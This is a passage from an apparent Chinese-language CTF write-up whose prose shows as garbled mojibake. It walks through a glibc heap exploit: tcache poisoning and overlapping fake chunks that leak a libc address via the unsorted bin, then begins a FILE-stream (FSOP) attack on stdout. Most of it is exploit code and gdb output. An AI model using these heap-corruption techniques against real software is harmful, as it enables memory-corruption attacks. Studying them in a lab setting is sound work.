<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(0x20)   tcache_entry[0](1): 0x55555555c2e0</span><br><span class="line">(0x30)   tcache_entry[1](1): 0x55555555c2b0 (overlap chunk with 0x55555555c2d0(freed) )</span><br><span class="line">(0x50)   tcache_entry[3](1): 0x55555555c2b0 (overlap chunk with 0x55555555c2d0(freed) )</span><br><span class="line">(0x60)   tcache_entry[4](1): 0x55555555c290 (overlap chunk with 0x55555555c2d0(freed) )</span><br></pre></td></tr></table></figure>

<ul>
<li>ç¬¬äºŒå‡å—</li>
</ul>
<p>ç°åœ¨ï¼Œå°†ç”¨å¤§è‡´ç›¸åŒçš„æ–¹å¼åˆ›å»ºå¦ä¸€ä¸ªå‡å— (åœ¨é—´éš”ä¸€äº›æ—¶é—´ä¹‹å):</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="string">&#x27;x&#x27;</span>, 0x30)                                  <span class="comment"># add for spacing, but used later</span></span><br><span class="line"><span class="built_in">rm</span>(<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="string">&#x27;C&#x27;</span>, 0x60)   <span class="comment"># create block to be freed and steal pointer in tcache - C = 340</span></span><br><span class="line">add(<span class="string">&#x27;D&#x27;</span>, 0x70, p64(0)*5 + p64(0xa1) + p64(0)) <span class="comment"># create block and fake block to put fake block meta in place - D = 3b0</span></span><br><span class="line"><span class="built_in">rm</span>(<span class="string">&#x27;D&#x27;</span>) <span class="comment"># D in tcache 0x80</span></span><br><span class="line">add(<span class="string">&#x27;E&#x27;</span>, 0x60, p64(0x21)*11)   <span class="comment"># create second 0x60, E, and spray with 0x21 for next block meta fake later, E = 430</span></span><br><span class="line"><span class="built_in">rm</span>(<span class="string">&#x27;C&#x27;</span>)               <span class="comment"># f1 empty, C in 0x70 tcache</span></span><br><span class="line">edit(<span class="string">&#x27;E&#x27;</span>, 0)      <span class="comment"># slot 2 -&gt; E, E-&gt;C in 0x70 tcache</span></span><br><span class="line">add(<span class="string">&#x27;E2&#x27;</span>, 0x60)  <span class="comment"># slots 1 and 2 -&gt; E, C in 0x70 tcache</span></span><br><span class="line"><span class="built_in">rm</span>(<span class="string">&#x27;E&#x27;</span>)               <span class="comment"># slot 1 -&gt; E, E -&gt; C in 0x70 tache</span></span><br><span class="line">edit(<span class="string">&#x27;E2&#x27;</span>, 0x60, b<span class="string">&#x27;\xe0&#x27;</span>) <span class="comment"># edit tcache pointer, C -&gt; fake2 in 0x70 tcache</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># next three fetch C from tcache, and get rid of it without putting it back in 0x70 tcache</span></span><br><span class="line">add(<span class="string">&#x27;E3&#x27;</span>, 0x60)   <span class="comment"># fetch E, fake in 0x70 tcache</span></span><br><span class="line">edit(<span class="string">&#x27;E3&#x27;</span>, 0x20)  <span class="comment"># E-end in 0x30 tcache</span></span><br><span class="line"><span class="built_in">rm</span>(<span class="string">&#x27;E3&#x27;</span>)          <span class="comment"># E in 0x50 tcache</span></span><br><span class="line"></span><br><span class="line">add(<span class="string">&#x27;fake2&#x27;</span>, 0x60, p64(0)*9 + p64(0x31) + p64(0))   <span class="comment"># get fake block, change key for E</span></span><br><span class="line"><span class="built_in">rm</span>(<span class="string">&#x27;E2&#x27;</span>) <span class="comment"># C</span></span><br><span class="line">add(<span class="string">&#x27;B&#x27;</span>, 0x70) <span class="comment"># B</span></span><br></pre></td></tr></table></figure>

<p>åœ¨è¿™é‡ŒåšåŒæ ·çš„äº‹æƒ…ï¼Œå°½ç®¡è¿™æ¬¡æœ‰å¦ä¸€ä¸ªå—ï¼Œåœ¨å·å–æŒ‡é’ˆçš„é‚£ä¸ªå—å’Œæœ‰é‚£ä¸ªæŒ‡é’ˆçš„é‚£ä¸ªå—ä¹‹é—´ã€‚æœ€åï¼Œç•™ä¸‹äº†ä¸¤ä¸ªé‡å å—çš„å¥æŸ„ã€‚å‡å—æŠ¥å‘Šçš„å¤§å°æ˜¯0xa1(å°½ç®¡ä¸èƒ½åœ¨è¿™ä¸ªç¨‹åºä¸­åˆ›å»ºé‚£ä¹ˆå¤§çš„å—)ï¼Œå¦ä¸€ä¸ªæ˜¯åœ¨å®ƒèƒ½å¤Ÿå†™å…¥è¿™ä¸ªå—ä¹‹å‰ã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">-----------------------------------</span><br><span class="line">[0x000055555555c3b0] B       : x</span><br><span class="line">[0x000055555555c3e0] fake2   : </span><br><span class="line">-----------------------------------</span><br><span class="line">0x55555555c3a0: 0x0000000000000000      0x0000000000000081  &lt;-- B meta</span><br><span class="line">0x55555555c3b0: 0x0000000000000a78      0x0000000000000000</span><br><span class="line">0x55555555c3c0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c3d0: 0x0000000000000000      0x00000000000000a1  &lt;-- fake2 meta</span><br><span class="line">0x55555555c3e0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c3f0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c400: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c410: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c420: 0x0000000000000000      0x0000000000000031  &lt;-- E meta</span><br><span class="line">-----------------------------------</span><br><span class="line">...[snip]...</span><br><span class="line">                  top: 0x55555555c490 (size : 0x20b70) </span><br><span class="line">       last_remainder: 0x0 (size : 0x0) </span><br><span class="line">            unsortbin: 0x0</span><br><span class="line">(0x20)   tcache_entry[0](1): 0x55555555c2e0</span><br><span class="line">(0x30)   tcache_entry[1](3): 0x55555555c430 --&gt; 0x55555555c430 (overlap chunk with 0x55555555c420(freed) )</span><br><span class="line">(0x40)   tcache_entry[2](2): 0x55555555c460 --&gt; 0x55555555c300</span><br><span class="line">(0x50)   tcache_entry[3](1): 0x55555555c2b0 (overlap chunk with 0x55555555c2d0(freed) )</span><br><span class="line">(0x60)   tcache_entry[4](1): 0x55555555c290 (overlap chunk with 0x55555555c2d0(freed) )</span><br></pre></td></tr></table></figure>

<ul>
<li>å¾—åˆ°æœªåˆ†ç±»çš„bin</li>
</ul>
<p>è¿™å…è®¸åšçš„æ˜¯é‡Šæ”¾fake2ï¼Œç„¶åä½¿ç”¨Bæ¥æ›´æ”¹å¯†é’¥ï¼Œç„¶åå†æ¬¡é‡Šæ”¾å®ƒã€‚å°†æ€»å…±é‡Šæ”¾å®ƒ8æ¬¡ï¼Œå‰7æ¬¡è¿›å…¥tcacheï¼Œæœ€åä¸€æ¬¡è¿›å…¥æœªæ’åºçš„binsï¼Œè¿™å°†æŠŠåŒé“¾è¡¨æŒ‡é’ˆç•™åœ¨å †ä¸Šã€‚è¿˜éœ€è¦ç¡®ä¿ä¸€ä¸ªå…ƒæ•°æ®åé¢çš„0xa0å­—èŠ‚æ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„å…ƒæ•°æ®ï¼Œè¿™å°±æ˜¯ä¸ºä»€ä¹ˆå½“åˆ›å»ºEæ—¶ï¼Œåœ¨é‡Œé¢å–·æ´’äº†å¾ˆå¤š0x21å­—èŠ‚ã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># é‡Šæ”¾fakeæ¥å¡«å……tcache, ç„¶åä»ä¿æŠ¤åŒé‡freeè¦†ç›–key</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(7):</span><br><span class="line">    edit(<span class="string">&#x27;fake2&#x27;</span>, 0x0)    <span class="comment"># ç©ºé—²çš„å‡å—ï¼ŒæŠŠ3e0æ”¾åˆ°0xa0 tcacheä¸­</span></span><br><span class="line">    edit(<span class="string">&#x27;B&#x27;</span>, 0x70, p64(0)*5 + p64(0xa1) + p64(0) + chr(i).encode()) <span class="comment"># B</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">rm</span>(<span class="string">&#x27;B&#x27;</span>) <span class="comment"># B</span></span><br><span class="line"><span class="built_in">rm</span>(<span class="string">&#x27;fake2&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>ç°åœ¨æ‰“å¼€äº†ä¸¤ä¸ªæ–‡ä»¶ï¼Œæ ˆä¸Šæœ‰ä¸€ä¸ªlibcåœ°å€:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">-----------------------------------</span><br><span class="line">[0x0000000000000000]         : (null)</span><br><span class="line">[0x0000000000000000]         : (null)</span><br><span class="line">-----------------------------------</span><br><span class="line">0x55555555c3a0: 0x0000000000000000      0x0000000000000081</span><br><span class="line">0x55555555c3b0: 0x0000000000000000      0x000055555555c010</span><br><span class="line">0x55555555c3c0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c3d0: 0x0000000000000000      0x00000000000000a1</span><br><span class="line">0x55555555c3e0: 0x00007ffff7fc3ca0      0x00007ffff7fc3ca0  &lt;-- libc meta</span><br><span class="line">0x55555555c3f0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c400: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c410: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c420: 0x0000000000000000      0x0000000000000031</span><br><span class="line">-----------------------------------</span><br><span class="line">                  top: 0x55555555c490 (size : 0x20b70) </span><br><span class="line">       last_remainder: 0x0 (size : 0x0) </span><br><span class="line">            unsortbin: 0x55555555c3d0 (overlap chunk with 0x55555555c420(freed) )</span><br><span class="line">(0x20)   tcache_entry[0](1): 0x55555555c2e0</span><br><span class="line">(0x30)   tcache_entry[1](3): 0x55555555c430 --&gt; 0x55555555c430 (overlap chunk with 0x55555555c420(freed) )</span><br><span class="line">(0x40)   tcache_entry[2](2): 0x55555555c460 --&gt; 0x55555555c300</span><br><span class="line">(0x50)   tcache_entry[3](1): 0x55555555c2b0 (overlap chunk with 0x55555555c2d0(freed) )</span><br><span class="line">(0x60)   tcache_entry[4](1): 0x55555555c290 (overlap chunk with 0x55555555c2d0(freed) )</span><br><span class="line">(0x80)   tcache_entry[6](1): 0x55555555c3b0</span><br><span class="line">(0xa0)   tcache_entry[8](7): 0x55555555c3e0 (overlap chunk with 0x55555555c420(freed) )  &lt;-- actually 7 <span class="keyword">in</span> there, but only shows once</span><br></pre></td></tr></table></figure>

<ul>
<li>è¿™ä¸ªæŒ‡é’ˆæ˜¯ä»€ä¹ˆ?</li>
</ul>
<p>è®©gdbæ‰“å°è¿™ä¸ªåœ°å€æ˜¾ç¤ºå®ƒåœ¨main_arena:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/xg 0x00007ffff7fc3ca0</span><br><span class="line">0x7ffff7fc3ca0 &lt;main_arena+96&gt;: 0x000055555555c490</span><br></pre></td></tr></table></figure>

<p><span class="exturl" data-url="aHR0cDovL2NvcmUtYW5hbHl6ZXIuc291cmNlZm9yZ2UubmV0L2luZGV4X2ZpbGVzL1BhZ2UzMzUuaHRtbA==">è¿™ç¯‡æ–‡ç« <i class="fa fa-external-link-alt"></i></span>å¾ˆå¥½åœ°è§£é‡Šäº†main_arenaæ˜¯ä»€ä¹ˆ:</p>
<p><em><strong>åº“glibcæœ‰ä¸€ä¸ªå…¨å±€çš„â€œstruct malloc_stateâ€å¯¹è±¡ï¼Œåä¸ºmain_arenaï¼Œå®ƒæ˜¯æ‰€æœ‰æ‰˜ç®¡å †å†…å­˜çš„rootã€‚</strong></em></p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/ropetwo-rshell.jpg"></li>
</ul>
<p>gdbæ˜¾ç¤ºäº†å®ƒå¦‚ä½•åŒ…å«å †ä¸­ä½¿ç”¨çš„æ‰€æœ‰ä¸åŒæŒ‡é’ˆçš„:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) p main_arena</span><br><span class="line"><span class="variable">$1</span> = &#123;mutex = 0, flags = 0, have_fastchunks = 0, fastbinsY = &#123;0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0&#125;, top = 0x55555555c490, last_remainder = 0x0, bins = &#123;0x55555555c3d0, 0x55555555c3d0, 0x7ffff7fc3cb0 &lt;main_arena+112&gt;, 0x7ffff7fc3cb0 &lt;main_arena+112&gt;, 0x7ffff7fc3cc0 &lt;main_arena+128&gt;, 0x7ffff7fc3cc0 &lt;main_arena+128&gt;, 0x7ffff7fc3cd0 &lt;main_arena+144&gt;, 0x7ffff7fc3cd0 &lt;main_arena+144&gt;, 0x7ffff7fc3ce0 &lt;main_arena+160&gt;, 0x7ffff7fc3ce0 &lt;main_arena+160&gt;, 0x7ffff7fc3cf0 &lt;main_arena+176&gt;, 0x7ffff7fc3cf0 &lt;main_arena+176&gt;, 0x7ffff7fc3d00 &lt;main_arena+192&gt;, 0x7ffff7fc3d00 &lt;main_arena+192&gt;, 0x7ffff7fc3d10 &lt;main_arena+208&gt;, 0x7ffff7fc3d10 &lt;main_arena+208&gt;, 0x7ffff7fc3d20 &lt;main_arena+224&gt;, 0x7ffff7fc3d20 &lt;main_arena+224&gt;, 0x7ffff7fc3d30 &lt;main_arena+240&gt;, 0x7ffff7fc3d30 &lt;main_arena+240&gt;, 0x7ffff7fc3d40 &lt;main_arena+256&gt;, 0x7ffff7fc3d40 &lt;main_arena+256&gt;, 0x7ffff7fc3d50 &lt;main_arena+272&gt;, 0x7ffff7fc3d50 &lt;main_arena+272&gt;, 0x7ffff7fc3d60 &lt;main_arena+288&gt;, 0x7ffff7fc3d60 &lt;main_arena+288&gt;, 0x7ffff7fc3d70 &lt;main_arena+304&gt;, 0x7ffff7fc3d70 &lt;main_arena+304&gt;, 0x7ffff7fc3d80 &lt;main_arena+320&gt;, 0x7ffff7fc3d80 &lt;main_arena+320&gt;, 0x7ffff7fc3d90 &lt;main_arena+336&gt;, 0x7ffff7fc3d90 &lt;main_arena+336&gt;, 0x7ffff7fc3da0 &lt;main_arena+352&gt;, 0x7ffff7fc3da0 &lt;main_arena+352&gt;, 0x7ffff7fc3db0 &lt;main_arena+368&gt;, 0x7ffff7fc3db0 &lt;main_arena+368&gt;, 0x7ffff7fc3dc0 &lt;main_arena+384&gt;, 0x7ffff7fc3dc0 &lt;main_arena+384&gt;, 0x7ffff7fc3dd0 &lt;main_arena+400&gt;, 0x7ffff7fc3dd0 &lt;main_arena+400&gt;, 0x7ffff7fc3de0 &lt;main_arena+416&gt;, 0x7ffff7fc3de0 &lt;main_arena+416&gt;, 0x7ffff7fc3df0 &lt;main_arena+432&gt;, 0x7ffff7fc3df0 &lt;main_arena+432&gt;, 0x7ffff7fc3e00 &lt;main_arena+448&gt;, 0x7ffff7fc3e00 &lt;main_arena+448&gt;, 0x7ffff7fc3e10 &lt;main_arena+464&gt;, 0x7ffff7fc3e10 &lt;main_arena+464&gt;, 0x7ffff7fc3e20 &lt;main_arena+480&gt;, 0x7ffff7fc3e20 &lt;main_arena+480&gt;, 0x7ffff7fc3e30 &lt;main_arena+496&gt;, 0x7ffff7fc3e30 &lt;main_arena+496&gt;, 0x7ffff7fc3e40 &lt;main_arena+512&gt;, 0x7ffff7fc3e40 &lt;main_arena+512&gt;, 0x7ffff7fc3e50 &lt;main_arena+528&gt;, 0x7ffff7fc3e50 &lt;main_arena+528&gt;, 0x7ffff7fc3e60 &lt;main_arena+544&gt;, 0x7ffff7fc3e60 &lt;main_arena+544&gt;, 0x7ffff7fc3e70 &lt;main_arena+560&gt;, 0x7ffff7fc3e70 &lt;main_arena+560&gt;, 0x7ffff7fc3e80 &lt;main_arena+576&gt;, 0x7ffff7fc3e80 &lt;main_arena+576&gt;, 0x7ffff7fc3e90 &lt;main_arena+592&gt;, 0x7ffff7fc3e90 &lt;main_arena+592&gt;, 0x7ffff7fc3ea0 &lt;main_arena+608&gt;, 0x7ffff7fc3ea0 &lt;main_arena+608&gt;, 0x7ffff7fc3eb0 &lt;main_arena+624&gt;, 0x7ffff7fc3eb0 &lt;main_arena+624&gt;, 0x7ffff7fc3ec0 &lt;main_arena+640&gt;, 0x7ffff7fc3ec0 &lt;main_arena+640&gt;, 0x7ffff7fc3ed0 &lt;main_arena+656&gt;, 0x7ffff7fc3ed0 &lt;main_arena+656&gt;, 0x7ffff7fc3ee0 &lt;main_arena+672&gt;, 0x7ffff7fc3ee0 &lt;main_arena+672&gt;, 0x7ffff7fc3ef0 &lt;main_arena+688&gt;, 0x7ffff7fc3ef0 &lt;main_arena+688&gt;, 0x7ffff7fc3f00 &lt;main_arena+704&gt;, 0x7ffff7fc3f00 &lt;main_arena+704&gt;, 0x7ffff7fc3f10 &lt;main_arena+720&gt;, 0x7ffff7fc3f10 &lt;main_arena+720&gt;, 0x7ffff7fc3f20 &lt;main_arena+736&gt;, 0x7ffff7fc3f20 &lt;main_arena+736&gt;, 0x7ffff7fc3f30 &lt;main_arena+752&gt;, 0x7ffff7fc3f30 &lt;main_arena+752&gt;, 0x7ffff7fc3f40 &lt;main_arena+768&gt;, 0x7ffff7fc3f40 &lt;main_arena+768&gt;, 0x7ffff7fc3f50 &lt;main_arena+784&gt;, 0x7ffff7fc3f50 &lt;main_arena+784&gt;, 0x7ffff7fc3f60 &lt;main_arena+800&gt;, 0x7ffff7fc3f60 &lt;main_arena+800&gt;, 0x7ffff7fc3f70 &lt;main_arena+816&gt;, 0x7ffff7fc3f70 &lt;main_arena+816&gt;, 0x7ffff7fc3f80 &lt;main_arena+832&gt;, 0x7ffff7fc3f80 &lt;main_arena+832&gt;, 0x7ffff7fc3f90 &lt;main_arena+848&gt;, 0x7ffff7fc3f90 &lt;main_arena+848&gt;, 0x7ffff7fc3fa0 &lt;main_arena+864&gt;, 0x7ffff7fc3fa0 &lt;main_arena+864&gt;, 0x7ffff7fc3fb0 &lt;main_arena+880&gt;, 0x7ffff7fc3fb0 &lt;main_arena+880&gt;, 0x7ffff7fc3fc0 &lt;main_arena+896&gt;, 0x7ffff7fc3fc0 &lt;main_arena+896&gt;, 0x7ffff7fc3fd0 &lt;main_arena+912&gt;, 0x7ffff7fc3fd0 &lt;main_arena+912&gt;, 0x7ffff7fc3fe0 &lt;main_arena+928&gt;, 0x7ffff7fc3fe0 &lt;main_arena+928&gt;, 0x7ffff7fc3ff0 &lt;main_arena+944&gt;, 0x7ffff7fc3ff0 &lt;main_arena+944&gt;, 0x7ffff7fc4000 &lt;main_arena+960&gt;, 0x7ffff7fc4000 &lt;main_arena+960&gt;, 0x7ffff7fc4010 &lt;main_arena+976&gt;, 0x7ffff7fc4010 &lt;main_arena+976&gt;, 0x7ffff7fc4020 &lt;main_arena+992&gt;, 0x7ffff7fc4020 &lt;main_arena+992&gt;, 0x7ffff7fc4030 &lt;main_arena+1008&gt;, 0x7ffff7fc4030 &lt;main_arena+1008&gt;, 0x7ffff7fc4040 &lt;main_arena+1024&gt;, 0x7ffff7fc4040 &lt;main_arena+1024&gt;, 0x7ffff7fc4050 &lt;main_arena+1040&gt;, 0x7ffff7fc4050 &lt;main_arena+1040&gt;, 0x7ffff7fc4060 &lt;main_arena+1056&gt;, 0x7ffff7fc4060 &lt;main_arena+1056&gt;, 0x7ffff7fc4070 &lt;main_arena+1072&gt;, 0x7ffff7fc4070 &lt;main_arena+1072&gt;, 0x7ffff7fc4080 &lt;main_arena+1088&gt;, 0x7ffff7fc4080 &lt;main_arena+1088&gt;, 0x7ffff7fc4090 &lt;main_arena+1104&gt;, 0x7ffff7fc4090 &lt;main_arena+1104&gt;, 0x7ffff7fc40a0 &lt;main_arena+1120&gt;, 0x7ffff7fc40a0 &lt;main_arena+1120&gt;, 0x7ffff7fc40b0 &lt;main_arena+1136&gt;, 0x7ffff7fc40b0 &lt;main_arena+1136&gt;, 0x7ffff7fc40c0 &lt;main_arena+1152&gt;, 0x7ffff7fc40c0 &lt;main_arena+1152&gt;, 0x7ffff7fc40d0 &lt;main_arena+1168&gt;, 0x7ffff7fc40d0 &lt;main_arena+1168&gt;, 0x7ffff7fc40e0 &lt;main_arena+1184&gt;, 0x7ffff7fc40e0 &lt;main_arena+1184&gt;, 0x7ffff7fc40f0 &lt;main_arena+1200&gt;, 0x7ffff7fc40f0 &lt;main_arena+1200&gt;, 0x7ffff7fc4100 &lt;main_arena+1216&gt;, 0x7ffff7fc4100 &lt;main_arena+1216&gt;, 0x7ffff7fc4110 &lt;main_arena+1232&gt;, 0x7ffff7fc4110 &lt;main_arena+1232&gt;, 0x7ffff7fc4120 &lt;main_arena+1248&gt;, 0x7ffff7fc4120 &lt;main_arena+1248&gt;, 0x7ffff7fc4130 &lt;main_arena+1264&gt;, 0x7ffff7fc4130 &lt;main_arena+1264&gt;, 0x7ffff7fc4140 &lt;main_arena+1280&gt;, 0x7ffff7fc4140 &lt;main_arena+1280&gt;, 0x7ffff7fc4150 &lt;main_arena+1296&gt;, 0x7ffff7fc4150 &lt;main_arena+1296&gt;, 0x7ffff7fc4160 &lt;main_arena+1312&gt;, 0x7ffff7fc4160 &lt;main_arena+1312&gt;, 0x7ffff7fc4170 &lt;main_arena+1328&gt;, 0x7ffff7fc4170 &lt;main_arena+1328&gt;, 0x7ffff7fc4180 &lt;main_arena+1344&gt;, 0x7ffff7fc4180 &lt;main_arena+1344&gt;, 0x7ffff7fc4190 &lt;main_arena+1360&gt;, 0x7ffff7fc4190 &lt;main_arena+1360&gt;, 0x7ffff7fc41a0 &lt;main_arena+1376&gt;, 0x7ffff7fc41a0 &lt;main_arena+1376&gt;, 0x7ffff7fc41b0 &lt;main_arena+1392&gt;, 0x7ffff7fc41b0 &lt;main_arena+1392&gt;, 0x7ffff7fc41c0 &lt;main_arena+1408&gt;, 0x7ffff7fc41c0 &lt;main_arena+1408&gt;, 0x7ffff7fc41d0 &lt;main_arena+1424&gt;, 0x7ffff7fc41d0 &lt;main_arena+1424&gt;, 0x7ffff7fc41e0 &lt;main_arena+1440&gt;, 0x7ffff7fc41e0 &lt;main_arena+1440&gt;, 0x7ffff7fc41f0 &lt;main_arena+1456&gt;, 0x7ffff7fc41f0 &lt;main_arena+1456&gt;, 0x7ffff7fc4200 &lt;main_arena+1472&gt;, 0x7ffff7fc4200 &lt;main_arena+1472&gt;, 0x7ffff7fc4210 &lt;main_arena+1488&gt;, 0x7ffff7fc4210 &lt;main_arena+1488&gt;, 0x7ffff7fc4220 &lt;main_arena+1504&gt;, 0x7ffff7fc4220 &lt;main_arena+1504&gt;, 0x7ffff7fc4230 &lt;main_arena+1520&gt;, 0x7ffff7fc4230 &lt;main_arena+1520&gt;, 0x7ffff7fc4240 &lt;main_arena+1536&gt;, 0x7ffff7fc4240 &lt;main_arena+1536&gt;, 0x7ffff7fc4250 &lt;main_arena+1552&gt;, 0x7ffff7fc4250 &lt;main_arena+1552&gt;, 0x7ffff7fc4260 &lt;main_arena+1568&gt;, 0x7ffff7fc4260 &lt;main_arena+1568&gt;, 0x7ffff7fc4270 &lt;main_arena+1584&gt;, 0x7ffff7fc4270 &lt;main_arena+1584&gt;, 0x7ffff7fc4280 &lt;main_arena+1600&gt;, 0x7ffff7fc4280 &lt;main_arena+1600&gt;, 0x7ffff7fc4290 &lt;main_arena+1616&gt;, 0x7ffff7fc4290 &lt;main_arena+1616&gt;, 0x7ffff7fc42a0 &lt;main_arena+1632&gt;, 0x7ffff7fc42a0 &lt;main_arena+1632&gt;, 0x7ffff7fc42b0 &lt;main_arena+1648&gt;, 0x7ffff7fc42b0 &lt;main_arena+1648&gt;, 0x7ffff7fc42c0 &lt;main_arena+1664&gt;, 0x7ffff7fc42c0 &lt;main_arena+1664&gt;, 0x7ffff7fc42d0 &lt;main_arena+1680&gt;, 0x7ffff7fc42d0 &lt;main_arena+1680&gt;...&#125;, binmap = &#123;0, 0, 0, 0&#125;, next = 0x7ffff7fc3c40 &lt;main_arena&gt;, next_free = 0x0, attached_threads = 1, system_mem = 135168, max_system_mem = 135168&#125;</span><br></pre></td></tr></table></figure>

<h2 id="æ³„éœ²Libc"><a href="#æ³„éœ²Libc" class="headerlink" title="æ³„éœ²Libc"></a>æ³„éœ²Libc</h2><ul>
<li>FSOPæ³„éœ²</li>
</ul>
<p>ä½¿ç”¨ä¸€ç§åä¸ºé¢å‘æ–‡ä»¶ç³»ç»Ÿç¼–ç¨‹(FSOP)çš„æŠ€æœ¯æ¥æ³„æ¼libcåœ°å€ã€‚FSOPçš„æ€æƒ³æ˜¯æ”»å‡»æ–‡ä»¶æµå¯¹è±¡çš„GLIBCå®ç°ã€‚è¿™ç¯‡<span class="exturl" data-url="aHR0cHM6Ly9nc2VjLmhpdGIub3JnL21hdGVyaWFscy9zZzIwMTgvV0hJVEVQQVBFUlMvRklMRSUyMFN0cnVjdHVyZXMlMjAtJTIwQW5vdGhlciUyMEJpbmFyeSUyMEV4cGxvaXRhdGlvbiUyMFRlY2huaXF1ZSUyMC0lMjBBbi1KaWUlMjBZYW5nLnBkZg==">2018å¹´çš„è®ºæ–‡<i class="fa fa-external-link-alt"></i></span>è¯¦ç»†ä»‹ç»äº†æ–‡ä»¶æµå’Œæ–‡ä»¶å¯¹è±¡ç»“æ„ã€‚å¦‚æœç¨‹åºè‡ªå·±åˆ›å»ºäº†ä¸€ä¸ªç”¨fopenæ‰“å¼€çš„æ–‡ä»¶ï¼Œå°±èƒ½æ‰¾åˆ°é‚£ä¸ªç»“æ„å¹¶æ‰“ä¹±å®ƒã€‚æ–‡ä»¶å¯¹è±¡ä¸­è¿˜æœ‰å‡½æ•°æŒ‡é’ˆï¼Œå¯ä»¥è¦†ç›–å®ƒä»¬ä»¥æ‰§è¡Œä»£ç ã€‚ä½†è¿˜ä¸èƒ½è¿™æ ·åšï¼Œå› ä¸ºè¿˜ä¸çŸ¥é“åº”è¯¥å†™ä»€ä¹ˆåœ°å€ã€‚</p>
<p>æ‰€èƒ½åšçš„æ˜¯æ‰¾åˆ°å¹¶è¦†ç›–_flagå’Œ_IO_write_baseæŒ‡é’ˆï¼Œä»¥ä¾¿åœ¨å†™å…¥è¯¥æ–‡ä»¶æµçš„ä¸‹ä¸€ä¸ªæ“ä½œä¸­å†™å…¥å…¶ä»–å†…å®¹ã€‚</p>
<p>å½“ç„¶ï¼Œæ‰€æœ‰è¿™äº›éƒ½å‡è®¾æœ‰ä¸€ä¸ªFILEå¯¹è±¡ã€‚stdinå’Œstdoutæ˜¯ä¿å­˜åœ¨LIBCç©ºé—´ä¸­çš„æ–‡ä»¶å¯¹è±¡ã€‚å› ä¸ºä½¿ç”¨çš„libcå¸¦æœ‰debugç¬¦å·ï¼Œå¯ä»¥é€šè¿‡åç§°æ‰“å°stdoutï¼Œå¹¶ä½¿ç”¨&amp;è·å¾—åœ°å€:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(gdb) p _IO_2_1_stdout_</span><br><span class="line"><span class="variable">$3</span> = &#123;file = &#123;_flags = -72537977, _IO_read_ptr = 0x7ffff7fc47e3 &lt;_IO_2_1_stdout_+131&gt; <span class="string">&quot;\n&quot;</span>, _IO_read_end = 0x7ffff7fc47e3 &lt;_IO_2_1_stdout_+131&gt; <span class="string">&quot;\n&quot;</span>, _IO_read_base = 0x7ffff7fc47e3 &lt;_IO_2_1_stdout_+131&gt; <span class="string">&quot;\n&quot;</span>, _IO_write_base = 0x7ffff7fc47e3 &lt;_IO_2_1_stdout_+131&gt; <span class="string">&quot;\n&quot;</span>, _IO_write_ptr = 0x7ffff7fc47e3 &lt;_IO_2_1_stdout_+131&gt; <span class="string">&quot;\n&quot;</span>, _IO_write_end = 0x7ffff7fc47e3 